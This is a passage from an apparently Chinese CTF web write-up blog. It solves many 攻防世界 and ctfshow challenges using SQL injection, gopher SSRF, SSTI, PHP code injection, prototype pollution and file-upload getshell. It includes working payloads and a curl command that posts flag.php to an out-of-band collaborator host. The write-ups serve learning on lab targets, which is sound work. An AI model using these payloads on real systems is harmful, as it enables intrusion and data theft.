urllib.parse.quote(test) \nnew = tmp.replace(\"%0A\",\"%0D%0A\")#需要用%0d%0a换行\nresult = urllib.parse.quote(new) #二次url编码，因为php在收到后就进行了一次解码\nprint(\"gopher://\"+host+\"/_\"+result)\n\n\n\n此时有回显，发现cookie处是admin经过base64加密的结果\n\n\n\ncookie注入\n在发的包里加一个Cookie=this_is_your_cookie=此处填写base64_encode(注入的payload)\n这里用admin&#39;)#测试成功，很奇怪\n发现可以报错注入，用extractvalue + 爆破信息的语句即可获得flag\n\n总结\n记得查看源代码\nssrf主要用gopher，除了gopher + mysql，还可以gopher://127.0.0.1:80/index.php\n要对构造gopher payload的脚本很熟悉\nCookie注入之前没注意过，要多看包的信息。\nCookie注入有admin&#39;)#这种闭合方式，多注意)。\n\n攻防世界 mfw(难度3)代码审计思路\n首先.git可以下载源码\n但是我忘记了GitHack可以查看源码\n\nwp\n下载源码后，有assert函数，这个东西当成eval处理\n\n\n\n所以这里可以通过闭合的方式注入page=') or system('/templates/flag.php')\npage='.system(\"cat ./templates/flag.php\").'\n\n总结\nor可以用在字符串中，作用相当于;\n可以用单行注释# 或 //,多行注释/*注释后面的内容\n\n攻防世界 fakebook(难度3)sql注入+ssrf思路\n这个题我之前做过，现在做还是不会，感觉现在明白点了\n\nwp\n\n注册之后，点击注册的用户，发现可能存在sql注入\n用sqlmap扫，没扫出来，于是手动注册\n内联注释绕过，发现是把数据序列化存入了\n\n\n\n扫描后台，发现源码，这里有curl_exec，如果我把data的内容换了，是不是就可以读取flag.php了\n\n\n\n通过union select 1,2,3,’序列化数据’，查看源码获得flag\n\n总结\n看到curl_exec想到file协议\nsql手动注入\nunion select改数据\n\n攻防世界 ics-05(难度3)php伪协议查看源码思路\n上来发现下面的页面，然后就不知道咋整了，尝试了很多种方法，这里其实应该想到，page&#x3D;index，可能存在文件包含，用伪协议读取源码\n\n\nwp\n伪协议读源码\nif ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123;\n\n    echo \"&lt;br >Welcome My Admin ! &lt;br >\";\n\n    $pattern = $_GET[pat];\n    $replacement = $_GET[rep];\n    $subject = $_GET[sub];\n\n    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;\n        preg_replace($pattern, $replacement, $subject);\n    &#125;else&#123;\n        die();\n    &#125;\n\n&#125;\n\n发现危险函数preg_replace，当$pattern指定模式为/e时，$replacement会被当做php代码执行\n$pattern=/test/e&amp;$replacement=system('ls')&amp;subject=test\n\n攻防世界 simple-js(难度3)js代码审计思路\n知道是看代码，但是我看不下去，所以没做出来\n其实认真看，这个题挺简单的\n\nwp\n\n审计代码，发现这个输出和输入没什么关系\n有一个可疑的字符串，把它用python输出一下,得到一串数据\n\n55,56,54,79,115,69,114,116,107,49,50\n\n猜测可能是ASCII码值，再用chr函数转换一下，就行了\n只审计代码，也可以，把tab2改成tab，也行。\n\n攻防世界 easytornado(难度3) SSTIwp\n\n测试后，发现这个界面，可能存在SSTI\n\n攻防世界 shrine(难度3) SSTI思路\n这个题，我看出来是SSTI，但是试了半天，不知道如何获取配置文件\n\n\n\n这里是把变量名为config的置为None\n\nwp\n通过__globals__获取app，再获取配置文件&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;\n\n总结模板获取配置文件有3种方式\n\n&#123;&#123;self.__dict__&#125;&#125;\nconfig\n&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;\n\n攻防世界 wife_wife(难度4) 原型链污染思路思路1：\n\n这个题只有登录，注册的界面\n发现注册的地方，有isAdmin，要填邀请码，还不需要爆破\n显然需要是isAdmin,才能获取flag\n所以思路就是得把isAdmin改成true\n那怎么改值，不会\n\n思路2：\n\n我以为下载的图片会有什么问题，但其实并没有\n\nwp\n\nObject.assign() 是一个 JavaScript 函数，用于将一个或多个源对象的属性复制到目标对象中。它的语法如下：\nObject.assign(target, ...sources)\n\n其中，target 表示目标对象，sources 表示一个或多个源对象\nconst target = &#123; a: 1, b: 2 &#125;;\nconst source = &#123; b: 4, c: 5 &#125;;\n\nObject.assign(target, source);\n\nconsole.log(target); // &#123; a: 1, b: 4, c: 5 &#125;\n\n在上面的示例中，target 对象的属性 b 被源对象 source 的属性 b 覆盖了，属性 c 则被复制到了 target 对象中。\n\n所以在注册的时候，添加一个&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:&quot;true&quot;&#125;\n\n\n攻防世界 Cat(难度4) django思路\n我在测试的时候输入cat，显示了这个是ping的界面，用以前的；截断，那些管道符不行，我就没招了\n\n\nwpfuzz测试\n测试一下有哪些可用的字符，上脚本,这里用了多线程，能快点\nimport requests\nimport concurrent.futures\nurl = \"http://61.147.171.105:63663/index.php?url=\"\n\ndef test_char(i):\n    r = requests.get(url + chr(i))\n    if(\"Invalid URL\" not in r.text):\n        print(f\"&#123;i&#125; &#123;chr(i)&#125;\")\n        \nwith concurrent.futures.ThreadPoolExecutor() as executor:\n    for i in range(32, 127):\n        executor.submit(test_char, i)\n\n测试之后，发现‘@’字符可用。\n\n之前在学Burp Collaborator时，用@可以读取文件信息。(md 实际上早都忘记了)\ncurl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net\n\n宽字节测试\n用%bf试一下，发现报错了。首先发现是django框架，且说明后端用的是gbk编码，超过%F7的在gbk中不再有意义\n\n\n\n接着根据报错信息，可以猜项目的路径是/opt/api\n\n\ndjango的特殊知识\ndjango项目下一般有个settings.py文件是设置网站数据库路径。\n接着就是猜settings.py的路径，我自己照着wp做的时候，猜是\n\nurl=@/opt/api/dnsapi/settings.py,但是没反应\n\n那就猜url=@/opt/api/api/settings.py\n全局搜索sqlite，发现了疑似的数据库路径\n\n\n\n访问url=@/opt/api/database.sqlite3,全局搜索ctf\n\n以下来自chatgpt：\n\nDjango 项目的 settings.py 文件通常位于项目根目录下，与项目的主要 Python 包（通常是包含 wsgi.py 文件的包）处于同一级别。\n\n假设你的 Django 项目的根目录名为 myproject，那么 settings.py 文件的路径应该是：\n/myproject/myproject/settings.py\n\n第一个 myproject 是项目的根目录，第二个 myproject 是包含 settings.py 文件的 Python 包的名称。如果你的项目名称不同，那么路径中的 myproject 部分应该替换为你的项目名称。\n\n\n总结\n框架的漏洞我还需要多总结\n大致思路一般都是找配置文件，找日志，找数据库\n之后把遇到的都总结一下\n\n攻防世界 Confusion1(难度4) SSTI思路\n这个题我之前做过，所以有点印象，看这个图和python有关，所以想到SSTI\n\n\n\n但是我始终没有找到入口，在哪输入，其实我也测试了/&#123;&#123;7*7&#125;&#125;,但是我没有仔细看回显，其实在404的报错页面是有回显的\n\n\n\n就差一点！！！！我好气\n然后就直接上payload就行了\n\n总结\n一定要多看回显的信息，多看包！！！\n\n攻防世界 FlatScience(难度4)SQlite注入思路\n这个题也是之前做过有点印象\n需要先扫一下目录，扫出来有login.php和admin.php\n测试一下，发现login.php界面可以sql注入\n但是数据库是sqlite不是mysql\n我测试的时候一直不行，因为没有仔细看包的回显信息，一定要记住这个！！\n\nwp\n注入测试之后，发现提示admin.php的密码在pdf文件中。\n这里需要查看源码，发现sha1加密\n用wget下载所有pdf\n写脚本提取每一个单词，判断单词的Sha1是否和数据库中的相等从而找到密码\n\n脚本import PyPDF2\nimport nltk\nfrom nltk.tokenize import word_tokenize\nimport os\nimport glob\nimport hashlib\n\ndef get_words(pdf_file):\n\n    # 创建PyPDF2的PdfFileReader对象\n    pdf_reader = PyPDF2.PdfFileReader(pdf_file)\n\n    # 获取PDF文件中的所有页面数量\n    num_pages = pdf_reader.getNumPages()\n\n    # 创建一个空字符串，用于存储PDF文件中的所有文本zl\n    pdf_text = ''\n\n    # 循环遍历PDF文件中的每一页，并将内容添加到pdf_text中\n    for page in range(num_pages):\n        page_obj = pdf_reader.getPage(page)\n        pdf_text += page_obj.extractText()\n\n        # 使用nltk库的word_tokenize函数将pdf_text中的文本拆分为单词\n        words = word_tokenize(pdf_text)\n\n        for word in words:\n            sha1 = hashlib.sha1()\n            salt_word = word + \"Salz!\"\n            sha1.update(salt_word.encode('utf-8'))\n            encoded_text = sha1.hexdigest()\n            if(encoded_text == '3fab54a50e770d830c0416df817567662a9dc85c'):\n                return word\n    return \n\nif __name__ == \"__main__\":\n    current_dir = os.getcwd()\n\n    # 构造一个搜索所有PDF文件的通配符\n    pdf_glob = os.path.join(current_dir, '*.pdf')\n\n    # 使用glob.glob函数获取所有PDF文件的文件名列表\n    pdf_files = glob.glob(pdf_glob)\n\n\n    for pdf_file in pdf_files:\n        # 打印PDF文件名\n        print(get_words(pdf_file))\n\n   \n总结\n看源码\n看包\n\n攻防世界 md5爆破+file协议读思路\n上来发现这里需要验证码，我猜到是爆破，但是我没尝试\n太可惜了，应该尝试一下的\n\nwp\npython写个多线程的脚本爆破，有三种方法\n\n方法1：\n\n这里最开始，我想按照之前那种多线程的方式写\nwith concurrent.futures.ThreadPoolExecutor() as executor:\n    for i in range(1, 100000):\n        executor.submit(test_char, i)\n\n但是代码在循环中生成大量的任务，并将它们提交给线程池，此时会导致内存占用过多，容易卡死\n\n\n方法2：\ntasks = [str(i) for i in range(1, max_num)]\n\n\n使用了一个简单的列表推导式（List Comprehension）来生成任务列表，这种方式会一次性生成所有的任务，可能会导致内存占用过高。\n\n方法3：\n\n下面这个使用生成器动态生成，一次只生成一个任务，可以节约内存。\nmax_num = 100000\n    with concurrent.futures.ThreadPoolExecutor() as executor:\n        # 使用生成器动态生成任务\n        tasks = (str(i) for i in range(1, max_num))\n        # 使用 map 方法并发执行任务\n        for _ in executor.map(find_char, tasks):\n            pass\n\n这将生成一个生成器对象，它可以通过迭代器协议（Iterator Protocol）来逐个生成任务。在 ThreadPoolExecutor.map() 方法中，当生成器生成新的任务时，线程池会自动将任务提交给线程池进行执行，直到生成器生成的所有任务都执行完毕。\n\n并发是指多个任务在同一时间段内交替执行\n\n\n完整代码：\nimport concurrent.futures\nimport hashlib\n\ndef find_char(i):\n    md5 = hashlib.md5()\n    md5.update(i.encode('utf-8'))\n    encode_string = md5.hexdigest()\n    if(encode_string[-6:] == \"359475\"):\n        print(i)\n        exit()\n\n    #4be21a\n\nif __name__ == \"__main__\":\n    max_num = 100000\n    with concurrent.futures.ThreadPoolExecutor() as executor:\n        # 使用生成器动态生成任务\n        tasks = (str(i) for i in range(1, max_num))\n        # 使用 map 方法并发执行任务\n        for _ in executor.map(find_char, tasks):\n            pass\n\n\n由于不需要使用迭代器中的元素，只需要并发地执行任务，因此使用一个下划线 _ 来占位，并在循环中使用 pass 语句来跳过迭代器中的元素。也就是**find_char**函数没有返回值\n\n如果有返回值的话，按照这么写\nfor result in executor.map(find_char, tasks):\n    print(result)\n\n此时用file访问&#x2F;etc&#x2F;passwd，发现有回显\n\n\n\n\n访问file:///flag，但是提示hack\n对flag进行url编码(all-characters)，是可以获得flag的\n\napache配置文件\n\n\n\n\n\n提示\n**&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf **是 Apache Web服务器的配置文件之一，它通常用于指定默认的虚拟主机和网站配置。在Debian和Ubuntu系统中，Apache的默认虚拟主机配置文件通常被存储在此目录下，以便系统管理员可以轻松地添加、编辑或删除虚拟主机。虚拟主机是一种机制，允许在同一物理服务器上托管多个网站，每个网站都可以拥有自己的域名、IP地址、文档根目录和配置。**000-default.conf **是默认的虚拟主机配置文件名称，它通常包含一些基本的网站配置，例如文档根目录、错误日志位置、访问日志格式等等。系统管理员可以通过编辑该文件来更改默认的网站配置，或添加新的虚拟主机配置。\n\n\n\n这里发现有个47852端口，访问它的网站默认页面index.php\n\n\n\n这里有命令执行，用gopher发送Post包，将cat /f* &gt; /1，读取文件\n\n提示：file:///f*这样是不可以的，只有命令执行语句才可以用通配符\nurl二次编码绕过对flag的过滤\n\n\n\n\n\n提示\n我发现一个神奇的事情\n\n用Hackbar、burpsuite就需要二次编码，符合我想的逻辑\n\n但是直接在框里提交就一次编码就行了。\n\n\n看源码发现用pref_match在当前页面过滤了flag，但是我没看到源码\n\n如果对flag进行二次编码，相当于php解析了一次，但是没有找到flag，所以绕过了\n\n但是file协议是可以读url编码后的flag的\n\n\n\n攻防世界 warmup(难度4) sql注入-别名思路\n这个题给了源码，我看了半天，发现禁用了许多字符，我以为就没有办法了\n但是其实禁用的字符里面没有单引号，这里发现会对输入的字符进行转义\n\n\nwp\"select username,password from \".$this->table.\" where username='\".$this->username.\"' and password='\".$this->password.\"'\n\n\n其实就是绕过这个，可以直接用万能密码绕过的\n\n\n\n由于上面这里是查admin的密码是不是输对了，也学到了一个新的方式，用别名绕过，在table处，用select 构造一个表构造admin的密码是123,然后在username处输入admin，password处输入123就可以了(select 'admin' username,'123' password)a\n\n攻防世界 BadProgrammer(难度5)原型链污染思路\n这个题也是没什么发现，直接看wp\n\nwp\ndirsearch扫目录，发现/static../\n\n\n\n看package.json有安装了什么包的信息\n\n\n\n也就是说这个express-fileupload可能有问题，直接百度查exp\n查看app.js\n\n\n\n这里发现一个可以post提交的地方\n用脚本post提交，将flag复制到可以查看的地方，package.json中发现项目的路径是/app\n\nctfshow web681 sql注入-\\转义思路\nburp抓包，发现有查询\n\n\n\n但是输入单引号显示不了，猜测后端可能把单引号置为空字符串””\n也过滤了空格\n这里我想了半天，不能闭合怎么办，也没想出来\n\nwp\n用单引号把原来查询语句中的单引号转义\nselect count(*) from ctfshow_users where username = '$username' or nickname = '$username'\n\n这里我输入aaa\\，就变成了红色部分是username的查询参数\n\n\nusername=&#39;**aaa\\&#39; or nickname =**&#39;aaa\\&#39;\n\n所以我把aaa改成or指定查询，此时第一个#由于在单引号内，被当作字符，第二个#被当成注释\n\nusername=&#39;**aaa\\#&#39; or nickname =**&#39;/**/or(1)#\\&#39;\n总结\nsql注入还是总结的不够，还需要再学习\n\nctfshow web682(js爆破)思路\n看hint发现是js代码\n\n\n\n这里我想到是爆破了，但是我迷信于随机生成字符，结果一直爆破不出来\n这个s2n2su函数中的c2n函数会返回a-f的字符，但是我当时想别的字符也有可能，因为会返回0 \n其实我就可以先拿a-f 0-9试\n\nwp\n\n\n\n\n\n提示\nitertools 是 Python 标准库中的一个模块，包含了许多用于高效循环迭代的工具函数。这个模块提供了一些用于生成迭代器的函数，可以帮助你更方便地处理迭代器、组合、排列、笛卡尔积等常见的组合计算问题。\n下面是一些常用的 itertools 函数：count(start&#x3D;0, step&#x3D;1)：生成一个无限循环的迭代器，从 start 开始，每次增加 step，可用于产生无限的数字序列。cycle(iterable)：将一个可迭代对象重复无限次，然后生成一个无限循环的迭代器，可用于反复遍历一个序列。repeat(elem, n&#x3D;None)：生成一个重复 elem 元素 n 次的迭代器，如果 n 为 None，则生成一个无限重复的迭代器。chain(*iterables)：将多个可迭代对象连接成一个迭代器，可用于将多个序列串联起来。combinations(iterable, r)：生成一个包含所有长度为 r 的组合的迭代器，可用于枚举序列中所有长度为 r 的组合。permutations(iterable, r&#x3D;None)：生成一个包含所有长度为 r 的排列的迭代器，如果 r 为 None，则生成包含所有排列的迭代器。product(*iterables, repeat&#x3D;1)：生成一个多个可迭代对象的笛卡尔积的迭代器，可用于生成多个序列的组合。等等。\n\n笛卡尔积就是全排列，每个对象中取一个元素，返回所有可能的情况ABC\n\n\n这里学到了itertools模块，可以高效的迭代，不用手动写很多循环\n\n这个代码使用 itertools.product() 函数生成所有可能的由 string 中的字符组合而成的长度为4的组合。\n\n这里就相当于写了4个for循环\nimport itertools\nimport hashlib\n\nstring = \"0123456789abcdef\"\ntarget_hash = \"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400\"\n\nfor aaa in itertools.product(string, repeat=4):\n    out1 = hashlib.sha256(''.join(aaa).encode('utf-8')).hexdigest()\n    if out1 == target_hash:\n        print(''.join(aaa))\n\n后面的就简单了，有个base32加密，直接用python base32解密就行了\nimport base64\nstr = 'GVSTMNDGGQ2DSOLBGUZA===='\ndecode = base64.b32decode(str.encode('utf-8'))\nstring1 = decode.decode(encoding)\nprint(string1)\n\n如果字节串的编码格式未知，可以使用 chardet 库来自动检测字节串的编码格式\nimport chardet\n\nbyte_string = b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'\nencoding = chardet.detect(byte_string)['encoding']\nstring = byte_string.decode(encoding)\nprint(string)\n\n攻防世界 i-got-id-200(难度6) perl文件上传思路\n没有思路，烦死了\n\nwp攻防世界-web-i-got-id-200（perl文件上传+ARGV造成任意文件读取和任意命令执行） - zhengna - 博客园\n\n都是.pl文件，.pl文件都是用perl编写的网页文件\n\n尝试之后发现，文件上传界面，可以把传入的文件中的文件内容打印出来。\n\n这就需要很了解这种语言的特性\n\n猜测后台代码是\nuse strict;\nuse warnings; \nuse CGI;\nmy $cgi= CGI->new;\nif ( $cgi->upload( 'file' ) ) &#123; \n    my $file= $cgi->param( 'file' );\n     while ( &lt;$file> ) &#123; print \"$_\"; &#125;\n&#125;\n\n这段代码使用param()方法获取文件名，用了尖括号符号&lt;&gt;，这表示从文件句柄中读取一行文本并赋值给变量$_。然后，print语句将$_打印到标准输出中。因此，这个while循环会一行一行地读取文件内容，直到文件结尾:::tip在给定的代码中，使用$cgi-&gt;param(‘file’)来获取上传文件的参数值。\n\n\n\n如果上传了多个文件，则**$file只会包含列表中的第一个文件名或文件句柄，而其他文件名或文件句柄则会被忽略。 my $file&#x3D; $cgi-&gt;param( ‘file’ );这个代码返回的是文件内容**\n\n如果需要处理多个文件，使用列表遍历my @files  &#x3D; $cgi-&gt;param(‘file’);foreach my $file (@files)  ) { \n处理每个文件}:::\n\n因此如果我传入第一个文件的内容是ARGV，它读的就是参数中的值，因此构造一下参数，就可以了\n\n:::tip&#x2F;bin&#x2F;bash表示启用bash命令\n-c 选项用于指定要执行的命令%20是空格，这里表示url的空格${IFS}是分隔符，默认是\\t\\n，也就是命令的空格bash -c ls |  表示执行ls \\ 并用管道(|)把它读到输入流中:::\n总结\nperl项目的目录位于/var/www/cgi-bin/下\n注意bash命令的使用\n\n攻防世界 comment(难度7) git源码补全思路\n上来有个登录密码的界面，就是让你爆破\n但是我没看出来\n\nwp\n\n这种有提示的界面就是爆破，且一般就是数字\n写个脚本，爆破出来是666\n扫目录发现是git源码泄露，用Githack下载，但是下载后的源码不全\n\n\n\n这里明显write，comment后应该有东西，因为提交的页面抓包是write\n在console处，也可以发现\n\n\ngit源码恢复\n\n\n\n\n\n提示\ngit log –reflog是 Git 中的一条命令，它可以显示 Git 引用日志，包括所有分支的提交历史记录和 HEAD 的更改历史记录。引用日志只记录本地仓库的更改历史记录，而不记录远程仓库的更改历史记录。因此，如果你需要查看远程仓库的更改历史记录，需要使用其他 Git 命令。git reset –hardgit reset –hard 是 Git 中的一条命令，它可以将当前分支重置为指定的提交，并丢弃工作目录和暂存区中的任何更改。当你运行 git reset –hard 命令时，Git 首先将 HEAD 指针移动到指定的提交。这意味着当前分支现在指向指定的提交，之后该提交之后对分支所做的任何更改都不再可用。然后，它将工作目录和暂存区重置为与指定提交时分支状态相匹配的状态。这意味着所有在指定提交后对工作目录或暂存区中的文件所做的更改都将被丢弃，并且文件将被恢复到该提交时的状态\n\n\n运行git log --reflog\n\n\n\n这里表示最近的提交是一个合并提交（Merge），它将两个父提交（bfbdf21 和 5556e3a）合并成一个新的提交（e5b2a24）。\n恢复到这个状态git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c\n\n\n\n这个我就不太懂了，wp说catgory没过滤\n\n这里就可以用单引号闭合\ncategory=1',content=(select database()),/*&amp;content=*/#\n\n注意这里要多行注释，中间执行不了用括号\n\n但是整了一圈发现数据库里没什么东西，而且也不可写，我就没招了\n\n查看/etc/passwd\n\n\n\n\n可以看到www用户使用了bash操作，查看base的历史\nselect load_file('/home/www/.bash_history')\n\n\n这里它先cd到tmp目录，解压了html.zip，又把所有的东西复制到了/var/www目录下，此时删除/var/www/html下的.DS_Store\n\n说明之前的html目录下有.DS_Store\n\nload_file加载文件，并解密\n\n\n\n\nload_file加载文件即可\n\n攻防世界 filemanager(难度7)思路\n扫目录看到有源码泄露\n代码审计，不知道咋做\n(这个时候我刚和dragon研究明白addslashes)\n\naddslashes\n\naddslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥\n但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行\n所以重点关注addslashes后，什么从数据库中取出来了，并放在了SQL语句中，因为这样就可以执行我构造的命令了\n\nwp\n查看源码\n\n\n\n发现这里会把存入的扩展名取出来，也就是这个oldname、extension是我可以构造的\n这题显然是getshell，关键是我如何把一个后缀改成.php\n后缀相同咋重命名？\n除非后缀为空。（卧槽，像是狄大人破案）\n显然我可以把上传的文件扩展名构造成空的。但是此时这个文件的文件名是1.txt.txt\n如果我直接改1.txt.txt—&gt;1.php\n也就是此时file_exists(&#39;1.txt&#39;)，但是 并不存在1.txt的文件\n所以我需要再上传一个1.txt，此时能过判断，再把1.txt.txt改成1.php，此时没有之前的后缀了，就改成功了\n\n总结\n找到addslashes后，又取出来放在sql语句中的地方\n还要很耐心才可以取得最后的flag\n\n攻防世界 Web_php_wrong_nginx_config(难度7)思路\n我如何获取到nginx的配置文件呢？/etc/nginx/sites-enabled/site.conf\n文件包含，或者读源码\n现在有输入框，但是测试了没什么反应\n\n\n\n有可能是这里么？\n\nwp\n我上面的猜想是对的，但是我不知道....//可以绕过../，没想到目录穿越\n访问....//....//....//....//etc/nginx/sites-enabled/site.conf时，可以看到配置文件\n\n\n\n这里我访问/web-img../，就会目录穿越\n\n\n\n后面的暂时不会\n\n攻防世界 wtf.sh-150(难度7)目录穿越+shell源码审计思路\n这个题上来好多页面，不想看就\n抓包发现这里可能有问题\n\n\n\n要不然就是admin处存在sql注入\n\n\n\n这个token现在我也看不出来啥东西，有可能是某种加密方式？试了base64，解不出来\n\nwp\n这种很复杂的题，上来就想目录穿越\n先别考虑sql注入什么的\n\n\n\n这里测试的时候，不只是要在?post=K81aH../，还要试试post.wtf?post=../\n这里就可以发现源码泄露，接着就是要耐心的源码审计\n然后可以发现\n\n\n\n也就是登陆时的cookie要改成admin的cookie，于是需要找到admin的cookie\n在源码中全局搜索admin的相关信息\n\n\n\n这里发现有个users目录，看看能不能穿越到该目录\n穿越成功，发现admin的cookie，于是抓包登录\n\n\n\n但是这样直接登录没反应，其实是因为界面没有变化，还是我注册的普通用户，那我就在proxy界面改\n\n\n\n此时再次抓包，就可以了\n\n\n\n但是这里只有半个flag，cnmd，接着进入漫长的代码审计\n\n这里发现服务器是可以执行.wtf文件的\nfunction include_page &#123;\n    # include_page &lt;pathname>\n    local pathname=$1\n    local cmd=\"\"\n    [[ \"$&#123;pathname:(-4)&#125;\" = '.wtf' ]];\n    local can_execute=$?\n    page_include_depth=$(($page_include_depth+1))\n    if [[ $page_include_depth -lt $max_page_include_depth ]]; then\n        local line\n        while read -r line; do\n            # check if we're in a script line or not ($ at the beginning implies script line)\n            # also, our extension needs to be .wtf\n            [[ \"$\" = \"$&#123;line:0:1&#125;\" &amp;&amp; $&#123;can_execute&#125; = 0 ]];\n            is_script=$?\n            # execute the line.\n            if [[ $is_script = 0 ]]; then\n                cmd+=$'\\n'\"$&#123;line#\"$\"&#125;\"\n            else\n                if [[ -n $cmd ]]; then\n                    eval \"$cmd\" || log \"Error during execution of $&#123;cmd&#125;\"\n                    cmd=\"\"\n                fi\n                echo $line\n            fi\n        done &lt; $&#123;pathname&#125;\n    else\n        echo \"&lt;p>Max include depth exceeded!&lt;p>\"\n    fi\n&#125;\n\n关键的是这两行，需要以.wtf结尾，需要以$开头\n\n   [[ \"$&#123;pathname:(-4)&#125;\" = '.wtf' ]];\n[[ \"$\" = \"$&#123;line:0:1&#125;\" &amp;&amp; $&#123;can_execute&#125; = 0 ]];\n\n接着就需要找到哪里可以上传.wtf文件\n\n\n\n\n这里也就是可以把username输出到next_file中\n那么我可以在username中写可执行的命令，然后，如果这里可以目录穿越，那我用目录穿越创建一个文件\n\n\n\n**这里我想不明白为什么要这样写            **:::tipm.wtf后面要加%09,表示制表符,否则会被当做目录去解析:::\n\n再创建一个用户，这样就可以了\n\n\n\n攻防世界 love_math(难度8)命令执行思路\n好久好久没做这种上来就给源码的，命令执行的题了，很像ctfshow的风格\n我想的就是能不能用函数名拼接成system，但是单引号被过滤了，显然不行\n这里我就没有再往下想一步，函数名不行，但是可以看函数的返回值呀\n\nwp\n逐个查每个函数的文档，查到base_convert这个函数\n\n\n\n也就是现在可以构造任意的字母和数字，\n // $oct = \"hex2bin\";\n$oct = \"phpinfo\";\n$dec = base_convert($oct,36,10);\n\n\n试一下phpinfo，是可以执行的\n\n\n\n\n那我想system ls，这个就也是直接构造就行了\n\n\n\n但是我想查看flag，这里需要用nl *，想到可以对他进行16进制编码，变成只有数字和小写字母组成的\n那就还需要一个函数把它变成二进制字符串，也就是需要构造一个hex2bin函数:::tip这里的二进制字符串就理解成普通字符串，是对二进制流ASCII编码的显示结果\n\n:::\n\n这里会太长，那就构造一个变量\n\n\n\n最终payload($pi=base_convert)(128891498,14,36)($pi(1438255411,14,34)(dechex(1852579882))) \n\n总结:::tip\n\nnl * 可以查看所有文件的内容\n16进制编码可以绕过对字符的限制\nphp的函数\nbase_convert函数\nhex2bin函数\ngetallheaders函数\n\n\nphp的异或:::攻防世界 web高手进阶区 8分题 love_math_攻防世界love_math_思源湖的鱼的博客-CSDN博客\n\n","slug":"CTF-web-wp","date":"2023-08-01T09:22:05.000Z","categories_index":"","tags_index":"CTF,web","author_index":"XyM4ster"},{"id":"4c90b088c95eb83a9985c879c9096e11","title":"hexo_config","content":"hexo 图片配置头像配置\n不知道为什么，hexo无法访问图床图片\n\n在设置头像时，创建source/images/picture.jpg ，在该文件夹下放图片\n\n运行时，可以用localhost:4000/images/picture.jpg访问到\n\n在_config.aurora.yml中配置头像地址\navatar: /images/picture.jpg\n\n","slug":"hexo-config","date":"2023-08-01T01:58:58.000Z","categories_index":"","tags_index":"hexo","author_index":"XyM4ster"},{"id":"cdb488d648a90943d7354784532a6374","title":"巅峰极客","content":"巅峰极客hellosql\n这个题我知道是时间延迟注入，也知道用笛卡尔积，但是我当时的方法就是测不出来\t\n过滤了* if 空格\n\n时间延迟我当时用的是\nSELECT A.table_name FROM information_schema.columns A, information_schema.columns B\n\nboogipop的wp\nSELECT group_concat('1') FROM information_schema.columns A, information_schema.columns B,information_schema.columns c\n\n过滤if我当时用的是,但是当时测试并不成功\nSELECT fid from file WHERE fid=10 or COALESCE(1&lt;2, 1)\n\nboogipop的wp\nid=1'or+elt(3>2,(SELECT+group_concat('1')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'2\n\n\nMySQL 中的 ELT() 函数是一个字符串函数，用于根据一个给定的索引值，返回一个列表中对应索引位置的元素。该函数的语法如下，这样就会返回后面的语句:::info\n\n对于这个group_concat(‘1’)，我也看到有用sum(0)的，总之就是让它随便算一个，因为后面的表已经足够大了:::\n\n\nwp\n我在想是不是我的闭合有问题，导致我没有测试成功\nbut这个题真的很简单\n\nunserialize题目\nClick to see more\n&lt;?php\nsession_start();\ninclude_once \"my.php\";\ninclude_once \"function.php\";\n\nif (!isset($_SESSION['login'])) &#123;\n\techo '&lt;script>alert(`Login First!`);location.href=`./index.php`;&lt;/script>';\n&#125;\n\n$login = @unserialize(a($_SESSION['login']));//字符减少\necho $login;\n?>\n\n\n&lt;?php\n\nclass pull_it &#123;\n\tpublic $x;\n\n\tfunction __construct($xx) &#123;\n\t\t$this->x = $xx;\n\t&#125;\n\n\tfunction __destruct() &#123;\n\t\tif ($this->x) &#123;\n\t\t\t$preg_match = 'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);';\n\t\tif (eval($preg_match)) &#123;\n\t\t\techo $preg_match;\n\t\t\texit(\"save_waf\");\n\t\t&#125;\n\t\t@eval($this->x);\n\t\t&#125;\n\t&#125;\t\n&#125;\nclass push_it &#123;\n\tprivate $root;\n\tprivate $pwd;\n\n\tfunction __construct($root, $pwd) &#123;\n\t\t$this->root = $root;\n\t\t$this->pwd = $pwd;\n\t&#125;\n\t\n\t\tfunction __destruct() &#123;\n\t\tunset($this->root);\n\t\tunset($this->pwd);\n\t&#125;\n\n\tfunction __toString() &#123;\n\t\tif (isset($this->root) &amp;&amp; isset($this->pwd)) &#123;\n\t\t\techo \"&lt;h1>Hello, $this->root&lt;/h1>\";\n\t\t&#125;\n\t\telse &#123;\n\t\t\techo \"&lt;h1>out!&lt;/h1>\";\n\t\t&#125;\n\t&#125;\n\n\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\ninclude_once \"my.php\";\ninclude_once \"function.php\";\ninclude_once \"login.html\";\nsession_start();\n\nif (isset($_POST['root']) &amp;&amp; isset($_POST['pwd'])) &#123;\n\t$root = $_POST['root'];\n\t$pwd = $_POST['pwd'];\n\t$login = new push_it($root, $pwd);\n\t\n\t$_SESSION['login'] = b(serialize($login));//过滤后字符变多\n\tdie('&lt;script>location.href=`./login.php`;&lt;/script>');\n\n&#125;\n\n\n\n?>\n\n\n&lt;?php\nfunction b($data) &#123;\n\treturn str_replace('aaaa', 'bbbbbb', $data);\n&#125;\n\nfunction a($data) &#123;\n\treturn str_replace('bbbbbb', 'aaaa', $data);\n&#125;\n\n// echo strlen(a('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'));\n// echo 